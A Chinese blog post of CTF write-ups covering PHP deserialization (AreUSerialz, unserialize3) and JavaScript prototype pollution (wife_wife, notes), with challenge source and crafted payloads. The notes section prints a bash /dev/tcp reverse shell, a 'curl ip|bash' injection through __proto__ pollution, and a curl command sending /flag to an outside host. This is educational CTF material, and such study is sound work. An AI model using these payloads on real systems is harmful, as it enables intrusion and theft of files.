<!DOCTYPE HTML>
<html lang="zh-CN">


<head>
    <meta charset="utf-8">
    <meta name="keywords" content="其他题1（队）, q1n9&#39;s blog">
    <meta name="description" content="[网鼎杯 2020 青龙组]AreUSerialz1https://www.runoob.com/php/func-filesystem-file-put-contents.html
《?php

include(&#34;flag.php&#34;);
">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="renderer" content="webkit|ie-stand|ie-comp">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="format-detection" content="telephone=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <meta name="referrer" content="no-referrer-when-downgrade">
    <!-- Global site tag (gtag.js) - Google Analytics -->


    <title>其他题1（队） | q1n9&#39;s blog</title>
    <link rel="icon" type="image/png" href="/favicon.png">
    


    <!-- bg-cover style     -->



<link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
<link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
<link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
<link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
<link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
<link rel="stylesheet" type="text/css" href="/css/matery.css">
<link rel="stylesheet" type="text/css" href="/css/my.css">
<link rel="stylesheet" type="text/css" href="/css/dark.css" media="none" onload="if(media!='all')media='all'">




    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
    <link rel="stylesheet" href="/css/post.css">




    



    <script src="/libs/jquery/jquery-3.6.0.min.js"></script>

<meta name="generator" content="Hexo 7.3.0">
<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
</head>


<body>
    <header class="navbar-fixed">
    <nav id="headNav" class="bg-color nav-transparent">
        <div id="navContainer" class="nav-wrapper container">
            <div class="brand-logo">
                <a href="/" class="waves-effect waves-light">
                    
                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
                    
                    <span class="logo-span">q1n9&#39;s blog</span>
                </a>
            </div>
            

<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
<ul class="right nav-menu">
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/" class="waves-effect waves-light">
      
      <i class="fas fa-home" style="zoom: 0.6;"></i>
      
      <span>首页</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/tags" class="waves-effect waves-light">
      
      <i class="fas fa-tags" style="zoom: 0.6;"></i>
      
      <span>标签</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/categories" class="waves-effect waves-light">
      
      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
      
      <span>分类</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/archives" class="waves-effect waves-light">
      
      <i class="fas fa-archive" style="zoom: 0.6;"></i>
      
      <span>归档</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/about" class="waves-effect waves-light">
      
      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
      
      <span>关于</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/contact" class="waves-effect waves-light">
      
      <i class="fas fa-comments" style="zoom: 0.6;"></i>
      
      <span>留言板</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/friends" class="waves-effect waves-light">
      
      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
      
      <span>友情链接</span>
    </a>
    
  </li>
  
  <li>
    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
    </a>
  </li>
  <li>
    <a href="javascript:;" class="waves-effect waves-light" onclick="switchNightMode()" title="深色/浅色模式" >
      <i id="sum-moon-icon" class="fas fa-sun" style="zoom: 0.85;"></i>
    </a>
  </li>
</ul>


<div id="mobile-nav" class="side-nav sidenav">

    <div class="mobile-head bg-color">
        
        <img src="/medias/logo.png" class="logo-img circle responsive-img">
        
        <div class="logo-name">q1n9&#39;s blog</div>
        <div class="logo-desc">
            
            welcome to my blog
            
        </div>
    </div>

    <ul class="menu-list mobile-menu-list">
        
        <li class="m-nav-item">
	  
		<a href="/" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-home"></i>
			
			首页
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/tags" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-tags"></i>
			
			标签
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/categories" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-bookmark"></i>
			
			分类
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/archives" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-archive"></i>
			
			归档
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/about" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-user-circle"></i>
			
			关于
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/contact" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-comments"></i>
			
			留言板
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/friends" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-address-book"></i>
			
			友情链接
		</a>
          
        </li>
        
        
        <li><div class="divider"></div></li>
        <li>
            <a href="https://github.com/lingqing777/lingqing777.github.io" class="waves-effect waves-light" target="_blank">
                <i class="fab fa-github-square fa-fw"></i>Fork Me
            </a>
        </li>
        
    </ul>
</div>


        </div>

        
            <style>
    .nav-transparent .github-corner {
        display: none !important;
    }

    .github-corner {
        position: absolute;
        z-index: 10;
        top: 0;
        right: 0;
        border: 0;
        transform: scale(1.1);
    }

    .github-corner svg {
        color: #0f9d58;
        fill: #fff;
        height: 64px;
        width: 64px;
    }

    .github-corner:hover .octo-arm {
        animation: a 0.56s ease-in-out;
    }

    .github-corner .octo-arm {
        animation: none;
    }

    @keyframes a {
        0%,
        to {
            transform: rotate(0);
        }
        20%,
        60% {
            transform: rotate(-25deg);
        }
        40%,
        80% {
            transform: rotate(10deg);
        }
    }
</style>

<a href="https://github.com/lingqing777/lingqing777.github.io" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
   data-tooltip="Fork Me" data-position="left" data-delay="50">
    <svg viewBox="0 0 250 250" aria-hidden="true">
        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
              fill="currentColor" class="octo-body"></path>
    </svg>
</a>
        
    </nav>

</header>

    



<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/6.jpg')">
    <div class="container" style="right: 0px;left: 0px;">
        <div class="row">
            <div class="col s12 m12 l12">
                <div class="brand">
                    <h1 class="description center-align post-title">其他题1（队）</h1>
                </div>
            </div>
        </div>
    </div>
</div>




<main class="post-container content">

    
    <div class="row">
    <div id="main-content" class="col s12 m12 l9">
        <!-- 文章内容详情 -->
<div id="artDetail">
    <div class="card">
        <div class="card-content article-info">
            <div class="row tag-cate">
                <div class="col s7">
                    
                    <div class="article-tag">
                        
                            <a href="/tags/ctf/">
                                <span class="chip bg-color">ctf</span>
                            </a>
                        
                            <a href="/tags/wp/">
                                <span class="chip bg-color">wp</span>
                            </a>
                        
                    </div>
                    
                </div>
                <div class="col s5 right-align">
                    
                </div>
            </div>

            <div class="post-info">
                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
                    2025-01-30
                </div>
                

                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
                    2025-09-01
                </div>
                

                
                <div class="info-break-policy">
                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
                    5.8k
                </div>
                

                
                <div class="info-break-policy">
                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
                    26 分
                </div>
                

                
                    <div id="busuanzi_container_page_pv" class="info-break-policy">
                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
                        <span id="busuanzi_value_page_pv"></span>
                    </div>
				
            </div>
        </div>
        <hr class="clearfix">

        
        <!-- 是否加载使用自带的 prismjs. -->
        <link rel="stylesheet" href="/libs/prism/prism.min.css">
        

        

        <div class="card-content article-card-content">
            <div id="articleContent">
                <h3 id="网鼎杯-2020-青龙组-AreUSerialz1"><a href="#网鼎杯-2020-青龙组-AreUSerialz1" class="headerlink" title="[网鼎杯 2020 青龙组]AreUSerialz1"></a>[网鼎杯 2020 青龙组]AreUSerialz1</h3><p><a href="https://">https://www.runoob.com/php/func-filesystem-file-put-contents.html</a></p>
<pre class="line-numbers language-none"><code class="language-none">《?php

include("flag.php");

highlight_file(__FILE__);

class FileHandler {

    protected $op;
    protected $filename;
    protected $content;

    function __construct() {#初始化并用process
        $op = "1";
        $filename = "/tmp/tmpfile";
        $content = "Hello World!";
        $this-&gt;process();
    }

    public function process() {#process根据$op的值决定是执行write方法（$op为"1"时）还是read方法（$op为"2"时），否则输出"Bad Hacker!"。
        if($this-&gt;op == "1") {
            $this-&gt;write();
        } else if($this-&gt;op == "2") {
            $res = $this-&gt;read();
            $this-&gt;output($res);
        } else {
            $this-&gt;output("Bad Hacker!");
        }
    }

    private function write() {#write将$content写入$filename指定的文件中，前提是$content长度不超过100个字符。
        if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) {
            if(strlen((string)$this-&gt;content) &gt; 100) {
                $this-&gt;output("Too long!");
                die();
            }
            $res = file_put_contents($this-&gt;filename, $this-&gt;content);#file_put_contents() 函数把一个字符串写入文件中。
            if($res) $this-&gt;output("Successful!");
            else $this-&gt;output("Failed!");
        } else {
            $this-&gt;output("Failed!");
        }
    }

    private function read() {#read+output读取$filename指定文件的内容。
        $res = "";
        if(isset($this-&gt;filename)) {
            $res = file_get_contents($this-&gt;filename);
        }
        return $res;
    }

    private function output($s) {#输出
        echo "[Result]: ";
        echo $s;
    }

    function __destruct() {#销毁
        if($this-&gt;op === "2")
            $this-&gt;op = "1";
        $this-&gt;content = "";
        $this-&gt;process();
    }

}

function is_valid($s) {
    for($i = 0; $i &lt; strlen($s); $i++)
        if(!(ord($s[$i]) &gt;= 32 &amp;&amp; ord($s[$i]) &lt;= 125))#检查输入字符串是否只包含ASCII码在32到125之间的字符。
            return false;
    return true;
}

if(isset($_GET{'str'})) {

    $str = (string)$_GET['str'];
    if(is_valid($str)) {
        $obj = unserialize($str);
    }

}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-none"><code class="language-none">《?php
class FileHandler {
    protected $op;
    protected $filename;
    protected $content;
    function __construct() {
        $this-&gt;op = 2;#还有就是是数字2不要加引号（**这里挺细节重要的的！！！**
        $this-&gt;filename = "flag.php";
        $this-&gt;content;#注意这里需要content为空（某人一开始忘改了
    }
}
$a = new FileHandler;
$result = serialize($a);
echo $result;
echo "\n";
$result=str_ireplace('*','',$result);
$payload=preg_replace('/[\x00-\x1F\x7F]/', '', $result);#某懒狗懒得手动换于是找了个不可见字符转化（
echo $payload;
#O:11:"FileHandler":3:{s:5:"  *  op";i:2;s:11:"  *  filename";s:8:"flag.php";s:10:"  *  content";s:10:"  *  content";N;}
#对比后再手动改一下数字
#O:11:"FileHandler":3:{s:2:"op";i:2;s:8:"filename";s:8:"flag.php";s:7:"content";N;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>怎么[Result]:是空的（哭<br><del>好吧还得用伪协议</del><br><code>filename = 'php://filter/read=convert.base64-encode/resource=flag.php'</code><br><code>?str=O:11:"FileHandler":3:{s:2:"op";i:2;s:8:"filename";s:57:"php://filter/read=convert.base64-encode/resource=flag.php";s:7:"content";N;}</code><br>补一下：</p>
<blockquote>
<p>传参后会被反序列化，反序列化时会先调用 _destruct 方法，因为传入 op 为 “2” 时会先被 _destruct 方法变为 “1”，所以要实现读操作即 op == “2” 成立就要先绕过 _destruct的干扰， 。<br>注意实现读操作的 op == “2” 是弱类型比较，也就是这里 2 == “2” 是成立的，而 _destruct的 op === “2” 是强类型比较，在这里 2 === “2” 不成立，也就是绕过了_destruct的干扰。所以 op 为 2 时可以成功实现读操作。</p>
</blockquote>
<p>嘶，原来这里还有个弱类型绕过（<del>我说我怎么一开始构的payload都failed</del>，原来是少了一个重要细节！！！</p>
<hr>
<h3 id="unserialize3"><a href="#unserialize3" class="headerlink" title="unserialize3"></a>unserialize3</h3><p><a href="https://">https://blog.csdn.net/qq_58784379/article/details/120169420</a><br><img src="https://pick.lwzheng.tech/2025/01/20/678ddd4b0c8ac.png" alt="1e2650f794aff362472e45a7b6ba71a5.png"></p>
<pre class="line-numbers language-none"><code class="language-none">《?php
class xctf
{
    public $flag = '111';

    public function __wakeup()
    {
        exit('bad requests');
    }
}
$result=new xctf();
$payload=serialize($result);
echo $payload;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><code>O:4:"xctf":1:{s:4:"flag";s:3:"111";}</code><br>绕过<br><code>O:4:"xctf":2:{s:4:"flag";s:3:"111";}</code></p>
<hr>
<h3 id="wife-wife"><a href="#wife-wife" class="headerlink" title="wife_wife"></a>wife_wife</h3><p><del>所以题目是对妮露的表白吗~<br><img src="https://pick.lwzheng.tech/2025/01/20/678ddd5139a41.png" alt="929dfb099c8537adaaba77b766b315a4.png"><br>~~疑似夹带私货</del><br><img src="https://pick.lwzheng.tech/2025/01/22/67904064ece23.png" alt="aedbec89271ab55ddd0e913a36643954.png"><br>但我不会js呀（哭<br><a href="https://">https://xz.aliyun.com/t/10032?time__1311=Cqjx2DRii%3DwxlxGgOKGOKD8YGCDBimaDOYD</a><br><a href="https://">https://www.freebuf.com/articles/web/275619.html</a><br><a href="https://">https://drun1baby.top/2022/12/29/JavaScript-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/#1-%E4%BB%80%E4%B9%88%E6%98%AF%E5%8E%9F%E5%9E%8B%EF%BC%88JavaScript-%E5%8E%9F%E5%9E%8B%E9%93%BE%E7%BB%A7%E6%89%BF%EF%BC%89</a><br><a href="https://">https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/assign</a></p>
<blockquote>
<p>当我们谈到继承时，JavaScript 只有一种结构：对象。每个函数对象有 prototype 属性，而实例对象没有，但所有的实例对象（函数，数组，对象）都会初始化一个私有属性 <strong>proto</strong> 指向它的 构造函数的原型对象 prototype。该原型对象也有一个自己的原型对象 <strong>proto</strong>，层层向上直到一个对象的原型对象为 null。根据定义，null 没有原型，并作为这个原型链中的最后一个环节。下面我们把构造函数、原型对象、以及实例对象的关系理清如下：</p>
<p>每个构造函数都有一个 prototype 原型对象<br>每个实例对象都有一个 <strong>proto</strong> 属性，并且指向它的构造函数的原型对象 prototype<br>对象里的 constructor 属性指向其构造函数本身<br>原型链污染简单来说就是如果能够控制并修改一个对象的原型，就可以影响到所有和这个对象同一个原型的对象。<br>newClass 实例化的对象 newObj 的 .<strong>proto</strong> 指向 newClass 类的 prototype</p>
</blockquote>
<p><img src="https://pick.lwzheng.tech/2025/01/21/678fbe7a6b6c2.png" alt="5f1e06db25fd4bebb4c38c032247c556.png"><br>通过newObj.__proto===newClass.prototype将上级污染<br>源码：</p>
<pre class="line-numbers language-none"><code class="language-none">// post请求的路径
app.post('/register', (req, res) =&gt; {
 
    let user = JSON.parse(req.body)  // 把我们输入的账号密码，从json字符串转成对象
 
    // 判断我们有没有输入账号和密码
    if (!user.username || !user.password) {  
        return res.json({ msg: 'empty username or password', err: true })
    }
    // 判断账号是否存在总对象的username里，如果相同的username就是重复用户名了
    if (users.filter(u =&gt; u.username == user.username).length) {  
        return res.json({ msg: 'username already exists', err: true })
    }
    // isAdmin是否true 与 邀请码是不是等于这个常量，所以sql注入没用，邀请码是个常量
    if (user.isAdmin &amp;&amp; user.inviteCode != INVITE_CODE) {
        user.isAdmin = false
        return res.json({ msg: 'invalid invite code', err: true })
    }
 
    // 使用系统函数复制对象，打包成一个新的对象
    let newUser = **Object.assign**({}, baseUser, user)//Object.assign() 方法只会拷贝源对象可枚举的的自有属性到目标对象。可以触发原型链污染
    users.push(newUser)  // 存到总对象里
    res.json({ msg: 'user created successfully', err: false })  // 设置返回信息<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><code>"__proto__":{"isAdmin":true}</code><br><img src="https://pick.lwzheng.tech/2025/01/21/678fc30fe42ca.png" alt="d5ed001bc9d0491262fd4aa0ba48d13c.png"><br>再登陆即可</p>
<hr>
<h3 id="网鼎杯-2020-青龙组-notes"><a href="#网鼎杯-2020-青龙组-notes" class="headerlink" title="[网鼎杯 2020 青龙组]notes"></a>[网鼎杯 2020 青龙组]notes</h3><p>依旧是这篇<a href="https://">https://xz.aliyun.com/t/10032?time__1311=Cqjx2DRii%3DwxlxGgOKGOKD8YGCDBimaDOYD#toc-14</a><br>有undefsafe() 函数解释（感觉这篇讲的挺好的</p>
<pre class="line-numbers language-none"><code class="language-none">var express = require('express');//&nbsp;require&nbsp;是一个用于引入模块的函数。&nbsp;express&nbsp;是一个流行的Web应用框架，用于快速搭建Web服务器和处理路由。
var path = require('path');//&nbsp;path&nbsp;模块是Node.js内置的，用于处理文件路径相关的操作
const undefsafe = require('undefsafe');//undesafe存在漏洞：当 undefsafe() 函数的第 2，3 个参数可控时，我们可以污染 object 对象中的值。
const { exec } = require('child_process');
//引入了Express框架、Node.js内置的&nbsp;path&nbsp;模块、&nbsp;undefsafe&nbsp;库（用于安全地访问对象属性）以及&nbsp;child_process&nbsp;模块中的&nbsp;exec&nbsp;方法（用于执行系统命令）。

var app = express();//创建了一个Express应用实例
class Notes {//定义了一个&nbsp;Notes&nbsp;类，用于管理笔记。包含了初始化方法、写入笔记、获取笔记、编辑笔记、获取所有笔记和删除笔记的方法。
    constructor() {
        this.owner = "whoknows";
        this.num = 0;
        this.note_list = {};
    }

    write_note(author, raw_note) {
        this.note_list[(this.num++).toString()] = {"author": author,"raw_note":raw_note};
    }

    get_note(id) {//undefsafe
        var r = {}
        undefsafe(r, id, undefsafe(this.note_list, id));
        return r;
    }

    edit_note(id, author, raw) {//undefsafe
        undefsafe(this.note_list, id + '.author', author);
        undefsafe(this.note_list, id + '.raw_note', raw);
    }

    get_all_notes() {
        return this.note_list;
    }

    remove_note(id) {
        delete this.note_list[id];
    }
}//=&gt;寻找get_note与edit_note

var notes = new Notes();//创建了一个&nbsp;Notes&nbsp;类的实例，并写入了一条初始笔记。
notes.write_note("nobody", "this is nobody's first note");


app.set('views', path.join(__dirname, 'views'));//设置Express应用查找视图文件的目录，&nbsp;path.join&nbsp;用于拼接目录路径，&nbsp;__dirname&nbsp;表示当前文件所在的目录，这里表示视图文件存放在&nbsp;views&nbsp;文件夹下。
app.set('view engine', 'pug');//设置应用使用的视图引擎为&nbsp;pug&nbsp;，这样Express在渲染视图时会使用&nbsp;pug&nbsp;的语法。
app.use(express.json());//启用对JSON格式请求体的解析，这样在处理请求时，Express可以自动将JSON格式的请求体解析为JavaScript对象。
app.use(express.urlencoded({ extended: false }));//启用对URL编码格式请求体的解析，&nbsp;extended: false&nbsp;表示使用简单的URL编码解析方式。
app.use(express.static(path.join(__dirname, 'public')));//设置Express应用提供静态文件服务，将&nbsp;public&nbsp;文件夹下的文件作为静态资源对外提供访问。


app.get('/', function(req, res, next) {//当用户访问根路径时，会执行这个函数
  res.render('index', { title: 'Notebook' });//通过&nbsp;res.render&nbsp;方法渲染&nbsp;index.pug&nbsp;视图，并传递一个&nbsp;title&nbsp;参数，值为&nbsp;"Notebook"
});

app.route('/add_note')//定义了&nbsp;/add_note&nbsp;路径的路由
    .get(function(req, res) {
        res.render('mess', {message: 'please use POST to add a note'});//对于GET请求，返回一个提示信息，建议使用POST方法添加笔记
    })
    .post(function(req, res) {//从请求体中获取&nbsp;author&nbsp;和&nbsp;raw&nbsp;（笔记内容），如果都存在，则调用&nbsp;notes.write_note&nbsp;方法添加笔记，并返回添加成功(失败)的消息。
        let author = req.body.author;
        let raw = req.body.raw;
        if (author &amp;&amp; raw) {
            notes.write_note(author, raw);
            res.render('mess', {message: "add note sucess"});
        } else {
            res.render('mess', {message: "did not add note"});
        }
    })

app.route('/edit_note')//与&nbsp;/add_note&nbsp;路由类似
    .get(function(req, res) {
        res.render('mess', {message: "please use POST to edit a note"});
    })
    .post(function(req, res) {
        let id = req.body.id;
        let author = req.body.author;
        let enote = req.body.raw;
        if (id &amp;&amp; author &amp;&amp; enote) {
            notes.edit_note(id, author, enote);//找到，很好的小白鼠（
            res.render('mess', {message: "edit note sucess"});
        } else {
            res.render('mess', {message: "edit note failed"});
        }
    })

app.route('/delete_note')//与&nbsp;/add_note&nbsp;路由类似
    .get(function(req, res) {
        res.render('mess', {message: "please use POST to delete a note"});
    })
    .post(function(req, res) {
        let id = req.body.id;
        if (id) {
            notes.remove_note(id);
            res.render('mess', {message: "delete done"});
        } else {
            res.render('mess', {message: "delete failed"});
        }
    })

app.route('/notes')
    .get(function(req, res) {//GET请求，从请求的查询参数中获取&nbsp;q
        let q = req.query.q;
        let a_note;
        if (typeof(q) === "undefined") {
            a_note = notes.get_all_notes();
        } else {
            a_note = notes.get_note(q);//找到。 undefsafe第三个参数随第二个变化，无法控制
        }
        res.render('note', {list: a_note});//通过&nbsp;res.render&nbsp;方法渲染&nbsp;note.pug&nbsp;视图，并将获取到的笔记数据传递给视图。
    })

app.route('/status')
    .get(function(req, res) {
        let commands = {
            "script-1": "uptime",//获取系统运行时间
            "script-2": "free -m"//获取系统内存使用情况
        };
        for (let index in commands) {//通过&nbsp;for...in&nbsp;循环遍历命令对象，使用&nbsp;exec&nbsp;方法执行每个命令。遍历command!!!好的
            exec(commands[index], {shell:'/bin/bash'}, (err, stdout, stderr) =&gt; {
                if (err) {//如果执行过程中出现错误，直接返回
                    return;
                }
                console.log(`stdout: ${stdout}`);//将命令的输出打印到控制台=》会过command的原型（也是note_list的）
            });
        }
        res.send('OK');
        res.end();
    })


app.use(function(req, res, next) {//404
  res.status(404).send('Sorry cant find that!');
});


app.use(function(err, req, res, next) {//500
  console.error(err.stack);
  res.status(500).send('Something broke!');
});


const port = 8080;//定义应用监听的端口为8080，调用&nbsp;app.listen&nbsp;方法启动Express应用。当应用成功启动后，会在控制台打印出应用的访问地址。
app.listen(port, () =&gt; console.log(`Example app listening at http://localhost:${port}`))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><code>ssh root@你的服务器</code><br>yum install httpd -y<br> systemctl start httpd<br>当然我用的finalshell<br>用的腾讯云，记得开一下自定义端口防火墙<br>可以用html<br><code> cd /var/www/html/</code><br><code> vim index.html</code><br><code>bash -i &gt;&amp; /dev/tcp/ip/端口 0&gt;&amp;1</code><br>这是一个在类Unix系统中创建反向Shell的命令。&nbsp;bash -i&nbsp; 启动一个交互式的 &nbsp;bash&nbsp;  shell，&nbsp;&gt;&amp;&nbsp; 用于重定向标准输出和标准错误输出，&nbsp;/dev/tcp/ip/端口&nbsp; 是一个特殊的文件描述符，用于建立与 IP地址的 &nbsp;xxxx端口的TCP连接，&nbsp;0&gt;&amp;1&nbsp; 则将标准输入也重定向到这个连接上。这样，攻击者就可以通过监听该端口来获取服务器的Shell权限，完全控制服务器。<br><code>id=__proto__.aaa&amp;author=curl ip|bash&amp;raw=lalala;（注意POST+访问/edit_note)</code><br>将自定义属性 &nbsp;aaa&nbsp; 添加到对象的原型上。curl&nbsp; 是一个用于发送HTTP请求的工具，&nbsp;|&nbsp; 是管道符，它将 &nbsp;curl&nbsp; 命令的输出作为 &nbsp;bash&nbsp; 命令的输入。整体意图是通过 &nbsp;curl&nbsp; 从指定的ip地址下载内容，并在服务器上使用 &nbsp;bash&nbsp; 执行下载的内容。raw凑数的（源代码edit_note那里先执行的author,就用author了。感觉反过来用raw也行，但就这样吧）<br><code>undefsafe(this.note_list, id + '.author', author);</code>（着重写出来一下）=》污染note_list<br><img src="https://pick.lwzheng.tech/2025/01/23/6791217347f08.png" alt="5d4fa0b3ac3ac89a212b36ff01c8aa41.png"><br><img src="https://pick.lwzheng.tech/2025/01/23/6791211bd21fa.jpg" alt="a7b7e7b25ce861ecead5e5f69b763a02.jpg"><br>或者<br>上传一个shell.txt<br><code>vim（nano） shell.txt</code><br><code>bash -i &gt;&amp; /dev/tcp/主机/端口 0&gt;&amp;1</code><br><code>id=__proto__.bb&amp;author=curl -F 'flag=@/flag' ip:端口&amp;raw=a</code><br>&nbsp;curl -F&nbsp; 是用于发送表单数据的选项，&nbsp;‘flag=@/flag’&nbsp; 表示将服务器上 &nbsp;/flag&nbsp; 文件的内容作为名为 &nbsp;flag&nbsp; 的表单字段发送出去（污染的原理一样,但这个直接发flag了<br>这里改为<code>id=__proto__.abc&amp;author=curl%20http://ip/shell.txt|bash&amp;raw=a</code>也行，但这个跟第一个方法就一样了<br>监听<br><code> nc -lvvp 2333</code><br>访问 /status 路由<br><img src="https://pick.lwzheng.tech/2025/01/23/6791d8566b13f.png" alt="6efc983f85d7a8968bb97a4e2dca02a1.png"></p>
<hr>
